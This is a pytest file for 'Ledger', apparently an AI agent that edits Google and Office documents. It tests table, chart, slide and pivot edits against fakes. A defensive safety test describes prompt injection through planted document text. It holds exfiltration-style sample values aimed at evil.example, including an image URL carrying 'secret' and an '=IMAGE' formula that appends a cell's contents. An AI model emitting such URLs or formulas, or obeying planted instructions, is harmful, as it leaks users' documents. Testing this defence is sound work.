"""Ledger does what a person does by hand in Sheets, Docs, Slides, Excel, Word and PowerPoint.

From a live test: Ledger made a 5 x 5 table in a Google Doc and then couldn't type the days of
the week into it ("I can only add new tables or paragraphs"), couldn't move a chart it had just
drawn in Sheets, and reported that the sheet had no chart. The Google edits here run against a
recording fake; the Office ones against real files in a temp folder.
"""

from __future__ import annotations

import json
from typing import Any

import pytest

from pyxi.agents import ledger
from pyxi.agents.ledger import GoogleDoc, GoogleSheet, GoogleSlides, LedgerError, run_ledger
from pyxi.agents.ledger_office import shift_formulas
from pyxi.connectors.google import DOCS_SCOPE, SLIDES_SCOPE, GoogleConnector


# ============================================================================ fakes
def doc_body(*items: Any) -> list[dict[str, Any]]:
    """A Google Doc body with real-looking indexes: a str is a paragraph, a list of rows a table."""
    content: list[dict[str, Any]] = [{"endIndex": 1, "sectionBreak": {}}]
    at = 1

    def para(text: str) -> dict[str, Any]:
        nonlocal at
        start = at
        at += len(text) + 1
        return {
            "startIndex": start,
            "endIndex": at,
            "paragraph": {
                "elements": [
                    {"startIndex": start, "endIndex": at, "textRun": {"content": text + "\n"}}
                ],
                "paragraphStyle": {"namedStyleType": "NORMAL_TEXT"},
            },
        }

    for item in items:
        if isinstance(item, str):
            content.append(para(item))
            continue
        start = at
        at += 1  # the table itself
        rows = []
        for row in item:
            at += 1  # the row
            cells = []
            for text in row:
                cell_start = at
                at += 1  # the cell
                cells.append({"startIndex": cell_start, "content": [para(text)], "endIndex": at})
            rows.append({"tableCells": cells})
        at += 1
        content.append(
            {
                "startIndex": start,
                "endIndex": at,
                "table": {"rows": len(item), "columns": len(item[0]), "tableRows": rows},
            }
        )
    return content


class FakeGoogle:
    """Records what Ledger sends to Sheets, Docs and Slides. Nothing reaches a real account."""

    def __init__(self) -> None:
        self.sent: list[dict[str, Any]] = []
        self.doc = {
            "title": "Week plan",
            "body": {"content": doc_body("Plan", [["", "", ""], ["", "", ""]], "")},
        }
        self.rows = [
            ["Region", "Rep", "Sales"],
            ["West", "Ana", 1200],
            ["East", "Bo", 800],
            ["West", "Cy", 300],
        ]
        self.charts = [
            {
                "chartId": 77,
                "spec": {"title": "Sales by Region", "basicChart": {"chartType": "COLUMN"}},
                "position": {
                    "overlayPosition": {
                        "anchorCell": {"sheetId": 7, "rowIndex": 0, "columnIndex": 9}
                    }
                },
            }
        ]
        self.deck = {
            "title": "Pitch",
            "pageSize": {
                "width": {"magnitude": 9144000, "unit": "EMU"},
                "height": {"magnitude": 5143500, "unit": "EMU"},
            },
            "layouts": [{"objectId": "L1", "layoutProperties": {"displayName": "Title and body"}}],
            "slides": [
                {
                    "objectId": "s1",
                    "slideProperties": {
                        "layoutObjectId": "L1",
                        "notesPage": {
                            "notesProperties": {"speakerNotesObjectId": "n1"},
                            "pageElements": [
                                {"objectId": "n1", "shape": {"shapeType": "TEXT_BOX"}}
                            ],
                        },
                    },
                    "pageElements": [
                        self.box("t1", "TITLE", "Old title"),
                        self.box("b1", "BODY", ""),
                    ],
                }
            ],
        }

    @staticmethod
    def box(object_id: str, placeholder: str, text: str) -> dict[str, Any]:
        shape: dict[str, Any] = {"shapeType": "TEXT_BOX", "placeholder": {"type": placeholder}}
        if text:
            shape["text"] = {
                "textElements": [{"endIndex": len(text) + 1, "textRun": {"content": text + "\n"}}]
            }
        return {
            "objectId": object_id,
            "size": {
                "width": {"magnitude": 3000000, "unit": "EMU"},
                "height": {"magnitude": 1000000, "unit": "EMU"},
            },
            "transform": {
                "scaleX": 2,
                "scaleY": 1,
                "translateX": 914400,
                "translateY": 457200,
                "unit": "EMU",
            },
            "shape": shape,
        }

    def connected(self) -> bool:
        return True

    async def open_for_edit(self, ref: str):
        return await GoogleConnector.open_for_edit(self, ref)  # type: ignore[arg-type]

    def _need_sheets(self) -> None:
        pass

    def _slides_error(self, exc: Exception) -> Exception:
        return exc

    async def _api(self, method: str, url: str, **kwargs: Any):
        self.sent.append({"api": (method, url, kwargs.get("json"))})
        return {"presentationId": "newdeck", "documentId": "newdoc", "spreadsheetId": "newsheet"}

    # sheets
    async def sheets_meta(self, sid):
        return {
            "properties": {"title": "Sales 2026"},
            "sheets": [{"properties": {"title": "Data", "sheetId": 7}, "charts": self.charts}],
        }

    async def sheets_charts(self, sid):
        return json.loads(json.dumps(self.charts))

    async def sheets_values(self, sid, a1, formulas=False):
        return self.rows

    async def sheets_write(self, sid, data):
        self.sent.append({"write": data})

    async def sheets_batch(self, sid, requests):
        self.sent += requests
        replies = [
            {"addSheet": {"properties": {"sheetId": 900 + i, "title": r["addSheet"]["properties"]["title"]}}}
            if "addSheet" in r
            else {"findReplace": {"occurrencesChanged": 2}}
            for i, r in enumerate(requests)
        ]
        return {"replies": replies}

    # docs
    async def docs_get(self, did):
        return self.doc

    async def docs_batch(self, did, requests):
        self.sent += requests
        return {"replies": [{"createHeader": {"headerId": "h1"}}]}

    async def drive_rename(self, file_id, name):
        self.sent.append({"rename": name})

    # slides
    async def slides_get(self, did):
        return self.deck

    async def slides_batch(self, did, requests):
        self.sent += requests
        for r in requests:
            if (
                "createSlide" in r
            ):  # Google lays out the placeholders; their ids come back on the next read
                new = r["createSlide"]["objectId"]
                self.deck["slides"].append(
                    {
                        "objectId": new,
                        "slideProperties": {
                            "notesPage": {"notesProperties": {"speakerNotesObjectId": new + "_n"}}
                        },
                        "pageElements": [
                            self.box(new + "_t", "TITLE", ""),
                            self.box(new + "_b", "BODY", ""),
                        ],
                    }
                )
        return {"replies": [{"replaceAllText": {"occurrencesChanged": 3}}]}


def names(sent: list[dict[str, Any]]) -> list[str]:
    return [next(iter(r)) for r in sent]


def answers(*edits: dict[str, Any]):
    """A model that returns these edits."""

    async def ask(system: str, prompt: str) -> tuple[str, float]:
        ask.system, ask.prompt = system, prompt  # type: ignore[attr-defined]
        return json.dumps({"edits": list(edits), "summary": "Done."}), 0.0001

    return ask


# ============================================================================ Google Docs
async def test_the_days_of_the_week_go_into_the_table_that_is_already_there():
    """Live: 'fill the top row with Saturday, Sunday...' failed with 'I can only add new tables'."""
    g = FakeGoogle()
    ask = answers(
        {"file": 0, "op": "set_table_cells", "row": 1, "values": ["Saturday", "Sunday", "Monday"]}
    )
    result = await run_ledger(
        "Fill the top row with the days",
        files=[],
        google=g,
        google_refs=["https://docs.google.com/document/d/abc/edit"],
        ask=ask,
    )
    assert result.changes == ["Filled 3 cells in the table"] and not result.problems
    typed = [(r["insertText"]["location"]["index"], r["insertText"]["text"]) for r in g.sent]
    # Last cell first, so typing in one cell never moves the place of the next.
    assert [t for _, t in typed] == ["Monday", "Sunday", "Saturday"]
    assert typed == sorted(typed, reverse=True)
    # The model was shown the table and how to name its cells, and only the document edits.
    assert "Table 1, a table here: 2 rows x 3 columns" in ask.prompt
    assert (
        "set_table_cells" in ask.system
        and "totals_row" not in ask.system
        and "add_slide" not in ask.system
    )


async def test_a_filled_table_is_shown_cell_by_cell_and_a_cell_is_rewritten_not_appended_to():
    g = FakeGoogle()
    g.doc["body"]["content"] = doc_body("Plan", [["Day", "Task"], ["Mon", "Gym"]], "")
    d = GoogleDoc(g, "abc")
    await d.load()
    outline = d.describe()
    assert "row 1: Day | Task" in outline and "row 2: Mon | Gym" in outline
    await d.apply({"op": "set_table_cells", "cells": {"B2": "Swim"}})
    assert names(g.sent) == ["deleteContentRange", "insertText"]
    gone = g.sent[0]["deleteContentRange"]["range"]
    assert gone["endIndex"] - gone["startIndex"] == len("Gym")
    assert g.sent[1]["insertText"] == {"location": {"index": gone["startIndex"]}, "text": "Swim"}
    with pytest.raises(LedgerError, match="2 rows by 2 columns"):
        await d.apply({"op": "set_table_cells", "cells": {"D1": "x"}})


async def test_a_table_gains_and_loses_rows_and_columns_and_can_be_shaded():
    g = FakeGoogle()
    d = GoogleDoc(g, "abc")
    await d.load()
    table_at = d._tables()[0]["startIndex"]
    await d.apply({"op": "add_table_row", "count": 2})
    assert names(g.sent) == ["insertTableRow", "insertTableRow"]
    assert g.sent[0]["insertTableRow"] == {
        "tableCellLocation": {
            "tableStartLocation": {"index": table_at},
            "rowIndex": 1,
            "columnIndex": 0,
        },
        "insertBelow": True,
    }
    g.sent.clear()
    await d.apply({"op": "delete_table_column", "column": "B"})
    assert g.sent[0]["deleteTableColumn"]["tableCellLocation"]["columnIndex"] == 1
    g.sent.clear()
    await d.apply({"op": "format_table", "range": "A1:C1", "fill": "light gray", "bold": True})
    shade = g.sent[0]["updateTableCellStyle"]
    assert shade["tableRange"]["rowSpan"] == 1 and shade["tableRange"]["columnSpan"] == 3
    assert shade["fields"] == "backgroundColor"
    assert names(g.sent).count("updateTextStyle") == 3
    g.sent.clear()
    # More rows than the table has: it grows first, as it would under someone's hands.
    record = g.docs_batch

    async def grows(did, requests):
        if "insertTableRow" in requests[0]:
            g.doc["body"]["content"] = doc_body("Plan", [["", "", ""]] * 3, "")
        return await record(did, requests)

    g.docs_batch = grows
    await d.apply({"op": "set_table_cells", "rows": [["a"], ["b"], ["c"]]})
    assert names(g.sent) == ["insertTableRow", "insertText", "insertText", "insertText"]


async def test_words_inside_a_table_can_be_found_and_formatted_and_the_page_set_up():
    g = FakeGoogle()
    g.doc["body"]["content"] = doc_body("Plan", [["Urgent task", "x"]], "")
    d = GoogleDoc(g, "abc")
    await d.load()
    await d.apply({"op": "format_text", "find": "Urgent", "bold": True, "color": "red"})
    rng = g.sent[0]["updateTextStyle"]["range"]
    cell_start = d._tables()[0]["table"]["tableRows"][0]["tableCells"][0]["content"][0][
        "startIndex"
    ]
    assert rng == {"startIndex": cell_start, "endIndex": cell_start + len("Urgent")}
    g.sent.clear()
    await d.apply({"op": "page_setup", "orientation": "landscape", "margin": 0.5})
    style = g.sent[0]["updateDocumentStyle"]["documentStyle"]
    assert style["pageSize"]["width"]["magnitude"] > style["pageSize"]["height"]["magnitude"]
    assert style["marginLeft"] == {"magnitude": 36.0, "unit": "PT"}
    g.sent.clear()
    assert (
        await d.apply({"op": "header", "text": "Draft", "align": "center"})
        == "Set the header to 'Draft'"
    )
    assert names(g.sent)[0] == "createHeader"
    assert g.sent[1]["insertText"]["location"] == {"segmentId": "h1", "index": 0}


# ============================================================================ Google Sheets
async def test_a_chart_that_is_there_shows_in_the_outline_and_moves():
    """Live: 'move the chart' failed, and Ledger said the sheet had no chart."""
    g = FakeGoogle()
    s = GoogleSheet(g, "sheet1")
    await s.load()
    assert "Chart id 77 'Sales by Region', its top left corner at J1" in s.describe()
    said = await s.apply({"op": "move_chart", "to": "E2"})
    assert said == "Moved the chart 'Sales by Region' to E2 on Data"
    assert g.sent == [
        {
            "updateEmbeddedObjectPosition": {
                "objectId": 77,
                "newPosition": {
                    "overlayPosition": {
                        "anchorCell": {"sheetId": 7, "rowIndex": 1, "columnIndex": 4}
                    }
                },
                "fields": "anchorCell",
            }
        }
    ]
    g.sent.clear()
    await s.apply({"op": "edit_chart", "chart": "sales", "title": "Revenue", "type": "line"})
    spec = g.sent[0]["updateChartSpec"]["spec"]
    assert spec["title"] == "Revenue" and spec["basicChart"]["chartType"] == "LINE"
    g.charts.clear()
    await s.load()
    with pytest.raises(LedgerError, match="no chart"):
        await s.apply({"op": "delete_chart"})


async def test_sorting_filtering_freezing_and_colouring_a_sheet():
    g = FakeGoogle()
    s = GoogleSheet(g, "sheet1")
    await s.load()
    await s.apply({"op": "sort", "by": "Sales", "descending": True})
    sort = g.sent[0]["sortRange"]
    assert sort["sortSpecs"] == [{"dimensionIndex": 2, "sortOrder": "DESCENDING"}]
    assert (sort["range"]["startRowIndex"], sort["range"]["endRowIndex"]) == (
        1,
        4,
    )  # never the header
    g.sent.clear()
    await s.apply({"op": "filter"})
    assert g.sent[0]["setBasicFilter"]["filter"]["range"]["startRowIndex"] == 0
    g.sent.clear()
    assert await s.apply({"op": "freeze", "columns": 1}) == "Froze the first 1 column on Data"
    grid = g.sent[0]["updateSheetProperties"]["properties"]["gridProperties"]
    assert grid == {"frozenRowCount": 0, "frozenColumnCount": 1}
    g.sent.clear()
    await s.apply(
        {
            "op": "format",
            "range": "A1:C1",
            "bold": True,
            "fill": "yellow",
            "border": "all",
            "align": "center",
        }
    )
    cell = g.sent[0]["repeatCell"]
    assert cell["cell"]["userEnteredFormat"]["horizontalAlignment"] == "CENTER"
    assert "userEnteredFormat.backgroundColorStyle" in cell["fields"]
    assert set(g.sent[1]["updateBorders"]) >= {"top", "innerVertical"}
    g.sent.clear()
    await s.apply(
        {
            "op": "conditional_format",
            "range": "C2:C4",
            "when": "greater than",
            "value": 1000,
            "fill": "light green",
        }
    )
    rule = g.sent[0]["addConditionalFormatRule"]["rule"]
    assert rule["booleanRule"]["condition"] == {
        "type": "NUMBER_GREATER",
        "values": [{"userEnteredValue": "1000"}],
    }
    g.sent.clear()
    await s.apply({"op": "delete_rows", "from": 3, "to": 4})
    assert g.sent[0]["deleteDimension"]["range"] == {
        "sheetId": 7,
        "dimension": "ROWS",
        "startIndex": 2,
        "endIndex": 4,
    }
    with pytest.raises(LedgerError, match="I don't know the rule"):
        await s.apply({"op": "conditional_format", "range": "C2:C4", "when": "sparkly"})


async def test_a_raw_request_reaches_what_no_edit_names_with_plain_ranges():
    g = FakeGoogle()
    s = GoogleSheet(g, "sheet1")
    await s.load()
    said = await s.apply(
        {
            "op": "raw",
            "did": "Protected the header",
            "requests": [
                {
                    "addProtectedRange": {
                        "protectedRange": {"range": "Data!A1:C1", "warningOnly": True}
                    }
                }
            ],
        }
    )
    assert said == "Protected the header"
    assert g.sent[0]["addProtectedRange"]["protectedRange"]["range"] == {
        "sheetId": 7,
        "startRowIndex": 0,
        "endRowIndex": 1,
        "startColumnIndex": 0,
        "endColumnIndex": 3,
    }


# ============================================================================ Google Slides
async def test_a_slides_deck_is_read_and_edited_by_the_ids_in_its_outline():
    g = FakeGoogle()
    deck = await g.open_for_edit("https://docs.google.com/presentation/d/deck123/edit#slide=id.p")
    assert isinstance(deck, GoogleSlides) and deck.id == "deck123"
    await deck.load()
    outline = deck.describe()
    assert "1 slide, each 10.00 x 5.62 inches" in outline
    assert "title [id t1] at 1.0,0.5 size 6.6x1.1: 'Old title'" in outline
    await deck.apply({"op": "set_title", "slide": 1, "text": "New title"})
    assert names(g.sent) == ["deleteText", "insertText"]  # what was there goes first
    g.sent.clear()
    await deck.apply(
        {"op": "add_slide", "title": "Roadmap", "bullets": ["Q1", "Q2"], "notes": "Go slow"}
    )
    made = g.sent[0]["createSlide"]
    assert made["slideLayoutReference"] == {"predefinedLayout": "TITLE_AND_BODY"}
    new = made["objectId"]
    typed = {
        r["insertText"]["objectId"]: r["insertText"]["text"] for r in g.sent if "insertText" in r
    }
    assert typed == {new + "_t": "Roadmap", new + "_b": "Q1\nQ2", new + "_n": "Go slow"}
    g.sent.clear()
    await deck.apply({"op": "move", "id": "t1", "x": 2, "y": 1, "w": 3.3})
    t = g.sent[0]["updatePageElementTransform"]["transform"]
    assert (t["translateX"], t["translateY"]) == (2 * 914400, 914400)
    assert round(t["scaleX"], 3) == round(3.3 / (3000000 / 914400), 3)  # half its old width
    g.sent.clear()
    await deck.apply(
        {
            "op": "add_text_box",
            "slide": 2,
            "text": "Hi",
            "x": 1,
            "y": 1,
            "w": 4,
            "h": 1,
            "size": 24,
            "color": "blue",
        }
    )
    assert names(g.sent) == ["createShape", "insertText", "updateTextStyle"]
    assert g.sent[0]["createShape"]["elementProperties"]["size"]["width"] == {
        "magnitude": 288.0,
        "unit": "PT",
    }
    with pytest.raises(LedgerError, match="needs the id"):
        await deck.apply({"op": "delete", "slide": 1})


async def test_new_slides_and_a_deck_by_name_open_as_slides():
    g = FakeGoogle()
    made = await g.open_for_edit("new slides: Q3 review")
    assert isinstance(made, GoogleSlides) and made.id == "newdeck"
    assert g.sent[0]["api"][2] == {"title": "Q3 review"}

    async def find(name, kind):
        return [{"id": "d9", "name": name}] if kind == "slides" else []

    g.drive_find = find
    assert isinstance(await g.open_for_edit("my pitch deck"), GoogleSlides)


# ============================================================================ safety
async def test_a_picture_is_only_loaded_from_a_site_the_user_named():
    """Google fetches a picture's address the moment it's placed: words planted in a document
    could have Ledger send that document out in the address."""
    assert (
        ledger.fetched_from(
            {"op": "add_image", "url": "https://evil.example/x.png?d=secret"}, "add our logo"
        )
        == "evil.example"
    )
    assert (
        ledger.fetched_from(
            {"op": "add_image", "url": "https://www.acme.com/logo.png"},
            "add the logo from acme.com/logo.png",
        )
        == ""
    )
    assert (
        ledger.fetched_from(
            {"op": "set_cells", "cells": {"A1": '=IMAGE("https://evil.example/?q="&B2)'}},
            "tidy this",
        )
        == "evil.example"
    )
    assert (
        ledger.fetched_from(
            {"op": "set_cells", "cells": {"A1": "see https://example.com"}}, "tidy this"
        )
        == ""
    )
    g = FakeGoogle()
    ask = answers(
        {"file": 0, "op": "add_image", "url": "https://evil.example/p.png?d=all+the+text"}
    )
    result = await run_ledger(
        "Tidy the headings",
        files=[],
        google=g,
        google_refs=["https://docs.google.com/document/d/abc/edit"],
        ask=ask,
    )
    assert not result.changes and "evil.example" in result.problems[0]
    assert not g.sent


def test_the_button_names_the_google_apps_still_waiting_for_an_ok(tmp_path, monkeypatch):
    g = GoogleConnector(tmp_path / "c", tmp_path / "docs")
    monkeypatch.setattr(g, "missing_scopes", lambda: [DOCS_SCOPE, SLIDES_SCOPE])
    assert g.needs_ok() == "Allow Docs and Slides"
    assert g.needs_ok("doc") == "Allow Docs" and g.needs_ok("sheet") == ""
    monkeypatch.setattr(g, "missing_scopes", lambda: [])
    assert g.needs_ok() == "" and g.needs_ok("doc") == ""


# ============================================================================ Excel
def excel(tmp_path):
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws.title = "Data"
    for row in (
        ["Item", "Qty", "Price", "Total"],
        ["Pens", 3, 2, "=B2*C2"],
        ["Ink", 1, 9, "=B3*C3"],
        ["Pads", 2, 4, "=B4*C4"],
    ):
        ws.append(row)
    ws.append(["Total", None, None, "=SUM(D2:D4)"])
    path = tmp_path / "stock.xlsx"
    wb.save(path)
    return ledger.Workbook(path)


def test_excel_rows_sort_together_and_formulas_follow_inserted_rows(tmp_path):
    book = excel(tmp_path)
    ws = book.wb["Data"]
    book.apply({"op": "sort", "by": "Item"})
    assert [ws.cell(r, 1).value for r in range(2, 5)] == ["Ink", "Pads", "Pens"]
    assert [ws.cell(r, 4).value for r in range(2, 5)] == ["=B2*C2", "=B3*C3", "=B4*C4"]
    assert [ws.cell(r, 3).value for r in range(2, 5)] == [9, 4, 2]  # each row kept its own numbers
    assert ws["A5"].value == "Total"  # the total row stays at the bottom
    book.apply({"op": "insert_rows", "at": 3, "count": 2})
    assert ws["D7"].value == "=SUM(D2:D6)" and ws["D5"].value == "=B5*C5"
    book.apply({"op": "delete_rows", "from": 3, "to": 4})
    assert ws["D5"].value == "=SUM(D2:D4)" and ws["D3"].value == "=B3*C3"


def test_shifted_formulas_keep_dollar_signs_and_other_sheets_follow(tmp_path):
    book = excel(tmp_path)
    other = book.wb.create_sheet("Summary")
    other["A1"] = "=Data!$D$5+SUM(Data!D2:D4)"
    other["A2"] = "=SUM(A1:A1)"  # its own cells: not Data's, so untouched
    shift_formulas(book.wb, book.wb["Data"], "row", 2, 1)
    assert other["A1"].value == "=Data!$D$6+SUM(Data!D3:D5)"
    assert other["A2"].value == "=SUM(A1:A1)"


def test_excel_gets_filters_frozen_panes_rules_dropdowns_and_a_chart_that_moves(tmp_path):
    from openpyxl import load_workbook

    book = excel(tmp_path)
    for op in (
        {"op": "filter"},
        {"op": "freeze"},
        {
            "op": "format",
            "range": "A1:D1",
            "bold": True,
            "fill": "light blue",
            "align": "center",
            "border": "all",
        },
        {
            "op": "conditional_format",
            "range": "D2:D4",
            "when": "greater than",
            "value": 7,
            "fill": "light red",
        },
        {"op": "dropdown", "range": "E2:E4", "options": ["Yes", "No"]},
        {"op": "resize", "columns": "A:D", "width": 140},
        {"op": "merge", "range": "A7:D7"},
        {"op": "note", "cell": "A1", "text": "Checked"},
        {"op": "chart", "labels": "Item", "values": "Qty", "type": "bar"},
        {"op": "move_chart", "to": "H10"},
        {"op": "rename_sheet", "sheet": "Data", "name": "Stock"},
    ):
        book.apply(op)
    assert "Chart 1" in book.describe() and "H10" in book.describe()
    out = book.save()
    ws = load_workbook(out)["Stock"]
    assert ws.auto_filter.ref == "A1:D4" and ws.freeze_panes == "A2"
    assert (
        ws["A1"].font.bold
        and ws["A1"].alignment.horizontal == "center"
        and ws["A1"].comment.text == "Checked"
    )
    assert ws["A1"].fill.start_color.rgb.endswith("CFE2F3")
    assert len(ws.conditional_formatting) == 1 and len(ws.data_validations.dataValidation) == 1
    assert ws.column_dimensions["B"].width == 20 and "A7:D7" in [
        str(m) for m in ws.merged_cells.ranges
    ]
    assert len(ws._charts) == 1
    with pytest.raises(LedgerError, match="Yes and No"):
        book.apply({"op": "checkbox", "range": "A1"})


# ============================================================================ Word
def test_word_tables_are_filled_grown_shaded_and_the_page_set_up(tmp_path):
    from docx import Document
    from docx.enum.section import WD_ORIENT

    doc = Document()
    doc.add_paragraph("Week plan")
    doc.add_table(rows=2, cols=3)
    path = tmp_path / "plan.docx"
    doc.save(str(path))
    d = ledger.WordDoc(path)
    assert "Table 1: 2 rows x 3 columns" in d.describe() and "row 1: (empty)" in d.describe()
    d.apply({"op": "set_table_cells", "row": 1, "values": ["Sat", "Sun", "Mon"]})
    d.apply({"op": "add_table_row", "after": 1, "values": ["a", "b", "c"]})
    d.apply({"op": "add_table_column", "after": "A", "values": ["new", "x"]})
    d.apply(
        {
            "op": "format_table",
            "range": "A1:D1",
            "fill": "light gray",
            "bold": True,
            "align": "center",
        }
    )
    d.apply({"op": "delete_table_row", "row": 3})
    d.apply({"op": "set_text", "i": 0, "text": "Plan for the week"})
    d.apply({"op": "insert_text", "text": " (draft)", "after_text": "week"})
    d.apply({"op": "page_setup", "orientation": "landscape", "margin": 0.75})
    d.apply({"op": "header", "text": "Confidential", "align": "right"})
    d.apply({"op": "spacing", "line": 1.5})
    out = Document(str(d.save()))
    table = out.tables[0]
    assert [[c.text for c in row.cells] for row in table.rows] == [
        ["Sat", "new", "Sun", "Mon"],
        ["a", "x", "b", "c"],
    ]
    assert table.cell(0, 0).paragraphs[0].runs[0].bold
    assert 'w:fill="EFEFEF"' in table.cell(0, 0)._tc.xml
    assert out.paragraphs[0].text == "Plan for the week (draft)"
    section = out.sections[0]
    assert section.orientation == WD_ORIENT.LANDSCAPE and section.page_width > section.page_height
    assert section.header.paragraphs[0].text == "Confidential"
    with pytest.raises(LedgerError, match="2 rows by 4 columns"):
        d.apply({"op": "set_table_cells", "cells": {"F1": "x"}})


# ============================================================================ PowerPoint
def test_powerpoint_gets_boxes_shapes_tables_charts_and_things_move(tmp_path):
    from pptx import Presentation
    from pptx.util import Inches

    prs = Presentation()
    slide = prs.slides.add_slide(prs.slide_layouts[1])
    slide.shapes.title.text = "Plan for growth"
    path = tmp_path / "deck.pptx"
    prs.save(str(path))
    d = ledger.Deck(path)
    outline = d.describe()
    assert "inches" in outline and "title [id " in outline and "'Plan for growth'" in outline
    d.apply(
        {
            "op": "add_text_box",
            "slide": 1,
            "text": "Hello there",
            "x": 1,
            "y": 5,
            "w": 4,
            "h": 1,
            "size": 20,
        }
    )
    d.apply({"op": "add_shape", "slide": 1, "shape": "star", "fill": "yellow", "x": 7, "y": 5})
    d.apply({"op": "add_table", "slide": 1, "rows": [["A", "B"], ["1", "2"]], "y": 3})
    d.apply({"op": "set_table_cells", "slide": 1, "cells": {"B2": "two"}})
    d.apply({"op": "format_text", "find": "growth", "bold": True, "color": "red"})
    d.apply({"op": "add_slide", "title": "Numbers", "layout": "title only"})
    d.apply(
        {
            "op": "add_chart",
            "slide": 2,
            "type": "bar",
            "categories": ["Q1", "Q2"],
            "series": {"Sales": [10, 20]},
            "title": "Sales",
        }
    )
    d.apply({"op": "duplicate_slide", "slide": 1})
    d.apply({"op": "move_slide", "slide": 3, "to": 1})
    d.apply({"op": "background", "slide": 1, "color": "navy"})
    box = next(
        s for s in d.prs.slides[1].shapes if s.has_text_frame and s.text_frame.text == "Hello there"
    )
    d.apply({"op": "move", "slide": 2, "id": box.shape_id, "x": 2, "y": 2, "w": 5})
    out = Presentation(str(d.save()))
    assert [s.shapes.title.text for s in out.slides] == [
        "Numbers",
        "Plan for growth",
        "Plan for growth",
    ]
    assert out.slides[0].shapes[-1].has_chart
    first = out.slides[1]
    runs = [(r.text, r.font.bold) for p in first.shapes.title.text_frame.paragraphs for r in p.runs]
    assert runs == [("Plan for ", None), ("growth", True)]  # only the word they named
    table = next(s for s in first.shapes if s.has_table).table
    assert table.cell(1, 1).text == "two"
    moved = next(s for s in first.shapes if s.has_text_frame and s.text_frame.text == "Hello there")
    assert (moved.left, moved.top, moved.width) == (Inches(2), Inches(2), Inches(5))
    copy = out.slides[2]
    assert len(copy.shapes) == len(first.shapes)  # the copy has the box, star and table too
    with pytest.raises(LedgerError, match="needs the id"):
        d.apply({"op": "delete", "slide": 1})


# ============================================================================ from the founder's trial
SHEET = "https://docs.google.com/spreadsheets/d/abc/edit"


async def test_a_pivot_with_two_value_columns_is_one_named_edit_on_its_own_tab():
    """Live: "pivot, rows Region, values sum of Units and sum of Sales, on a new sheet" had no
    named edit for two values. The model wrote the requests out by hand, its reply ran past
    the limit, and the job ended "I couldn't make that change", twice."""
    g = FakeGoogle()
    g.rows = [["Region", "Product", "Units", "Sales"], ["West", "Laptop", 12, 14400], ["East", "Laptop", 8, 9600]]
    ask = answers({"file": 0, "op": "pivot", "group_by": "Region", "value": ["Units", "Sales"], "agg": "sum", "target": "Pivot"})
    result = await run_ledger("pivot by region", files=[], google=g, google_refs=[SHEET], ask=ask)
    assert result.changes == ["Made a pivot table on tab Pivot: sum of Units and Sales by Region"]
    added, cells = g.sent[-2], g.sent[-1]["updateCells"]
    assert added["addSheet"]["properties"]["title"] == "Pivot" and cells["start"]["sheetId"] == 900
    pivot = cells["rows"][0]["values"][0]["pivotTable"]
    assert [v["sourceColumnOffset"] for v in pivot["values"]] == [2, 3]
    assert {v["summarizeFunction"] for v in pivot["values"]} == {"SUM"}
    assert '"value"?: column or [columns]' in ask.system  # the menu says so


async def test_a_plan_that_cant_be_read_is_asked_for_again_and_then_said_plainly():
    g = FakeGoogle()
    replies = ["<invoke_json_placeholder>" * 50, json.dumps({"edits": [{"file": 0, "op": "pivot", "group_by": "Region", "value": "Sales"}], "summary": "Pivot made."})]
    asked: list[str] = []

    async def cut_off_once(system: str, prompt: str):
        asked.append(prompt)
        return replies[len(asked) - 1], 0.0001

    result = await run_ledger("make a pivot", files=[], google=g, google_refs=[SHEET], ask=cut_off_once)
    assert len(asked) == 2 and "could not be read" in asked[1] and "ONLY that JSON object" in asked[1]
    assert result.changes and result.changes[0].startswith("Made a pivot table beside the data")

    # Unreadable both times: nothing is touched, and the reason is said, not left out.
    g = FakeGoogle()

    async def never(system: str, prompt: str):
        return "<invoke_json_placeholder>" * 50, 0.0001

    result = await run_ledger("make a pivot", files=[], google=g, google_refs=[SHEET], ask=never)
    assert g.sent == [] and not result.changes
    assert result.summary.startswith("I couldn't make that change. I couldn't work out the edits for it")
    assert "Nothing in the file was touched" in result.summary
